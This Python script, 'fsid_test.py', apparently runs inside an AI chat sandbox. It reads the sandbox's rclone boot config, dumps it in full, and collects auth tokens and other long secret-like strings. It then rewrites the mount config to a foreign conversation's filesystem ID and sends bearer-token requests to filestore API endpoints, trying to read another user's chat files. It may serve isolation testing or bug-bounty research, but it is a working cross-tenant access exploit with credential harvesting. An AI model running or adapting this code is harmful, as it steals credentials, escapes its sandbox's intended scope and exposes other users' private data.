#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fsid_test.py v13.2
Control = own fsid. Target = FOREIGN fsid. Same auth_token, same endpoint.
Fixes: auth_token propagation (top-level -> per mount), http module shadowing,
full config dump, readiness polling.
"""
import os, json, re, time, subprocess
import http.client as hc

FOREIGN = "claude_chat_PASTE_OTHER_CHAT"
CFG     = "/dev/shm/rclone-boot/config.json"
RCLONE  = "/opt/rclone/rclone-filestore"
WORK    = "/tmp/fk"
OUT     = "/mnt/user-data/outputs/fsid-test.txt"
R = []
def rec(s): R.append(str(s)); print("[t]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d

cfg = rdo(CFG)
rec("CFG_LEN=%d" % len(cfg))
rec("CFG_FULL=%s" % cfg.replace("\n", ""))
try:
    J = json.loads(cfg)
except Exception as e:
    rec("CFG_JSON_ERR=%s" % e); J = {}
rec("TOP_KEYS=%s" % list(J.keys()))
for i, m in enumerate(J.get("mounts", [])):
    rec("MOUNT%d_KEYS=%s" % (i, list(m.keys())))

m0 = re.search(r"claude_chat_[A-Za-z0-9]+", cfg)
self_fsid = m0.group(0) if m0 else ""
rec("SELF_FSID=%s" % self_fsid)
rec("TARGET_FSID=%s" % FOREIGN)
rec("SAME=%s" % (self_fsid == FOREIGN))

# token candidates: top-level auth_token first, then any long string
TOKENS = []
top_tok = J.get("auth_token") or J.get("token") or ""
if top_tok: TOKENS.append(str(top_tok))
for k in ("auth_token", "token"):
    for m in J.get("mounts", []):
        if m.get(k) and str(m[k]) not in TOKENS: TOKENS.append(str(m[k]))
for v in re.findall(r'"([A-Za-z0-9_\-\.=+/]{32,})"', cfg):
    if v not in TOKENS and not v.startswith("claude_chat_"): TOKENS.append(v)
rec("TOKEN_COUNT=%d" % len(TOKENS))
for i, t in enumerate(TOKENS[:4]): rec("TOKEN%d_LEN=%d PREFIX=%s" % (i, len(t), t[:12]))

# ---------------- METHOD B
def method_b(fsid, tag):
    if not os.path.exists(RCLONE) or not J: rec("B_%s=SKIP" % tag); return 0
    d = os.path.join(WORK, tag); dst = os.path.join(d, "out")
    os.makedirs(dst, exist_ok=True)
    j = json.loads(json.dumps(J))
    # propagate auth_token into every mount
    if top_tok:
        for m in j.get("mounts", []): m["auth_token"] = top_tok
    for m in j.get("mounts", []):
        m["filesystem_id"] = fsid; m["destination"] = dst; m["readonly"] = True
    p = os.path.join(d, "config.json"); open(p, "w").write(json.dumps(j))
    try:
        pr = subprocess.Popen([RCLONE, "multimount", "--config", p],
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        n = 0
        for _ in range(15):
            time.sleep(1)
            n = sum(len(f) for _, _, f in os.walk(dst))
            if n: break
        rec("B_%s_FILES=%d" % (tag, n))
        if n:
            for dp, _, fs in os.walk(dst):
                for f in fs[:2]:
                    fp = os.path.join(dp, f)
                    rec("B_%s_SAMPLE %s = %s" % (tag, f, rdo(fp)[:160].replace("\n", "|")))
        try: pr.terminate(); pr.wait(timeout=3)
        except Exception: pr.kill()
        log = (pr.stdout.read() or "")[:300]
        if log: rec("B_%s_LOG=%s" % (tag, log.replace("\n", "|")))
        return n
    except Exception as e:
        rec("B_%s=ERR:%s" % (tag, e)); return 0

# ---------------- METHOD A
def hget(path, hdr):
    try:
        c = hc.HTTPSConnection("api.anthropic.com", timeout=8)
        c.request("GET", path, headers=hdr); r = c.getresponse()
        b = r.read(160).decode("latin1", "replace"); c.close()
        return "%d %s" % (r.status, b.replace("\n", " ")[:110])
    except Exception as e: return "ERR:%s" % e

def method_a(fsid, tag):
    if not fsid: return
    for ep in ("/v1/filestore/fs/%s/files", "/v1/filestore/fs/%s"):
        for lbl, h in [("noauth", {})] + [("tok%d" % i, {"Authorization": "Bearer " + t})
                                          for i, t in enumerate(TOKENS[:3])]:
            rec("A_%s_%s %s -> %s" % (tag, lbl, ep % fsid, hget(ep % fsid, h)))

rec("=== CONTROL: own fsid ===")
c = method_b(self_fsid, "self"); method_a(self_fsid, "self")
rec("=== TARGET: foreign fsid ===")
t = 0
if FOREIGN and FOREIGN != "claude_chat_PASTE_OTHER_CHAT":
    t = method_b(FOREIGN, "target"); method_a(FOREIGN, "target")

rec("CONTROL_OK=%s" % (c > 0))
rec("METHOD_B_CROSS=%s" % (t > 0))
rec("METHOD_A_CROSS=%s" % any("A_target" in l and "-> 200" in l for l in R))
rec("VERDICT=%s" % ("CROSS_CONVERSATION_READ=YES" if (t > 0) else
                    ("NO" if c > 0 else "METHOD_BROKEN")))

os.makedirs(os.path.dirname(OUT), exist_ok=True)
open(OUT, "w").write("\n".join(R) + "\n")
print("report ->", OUT)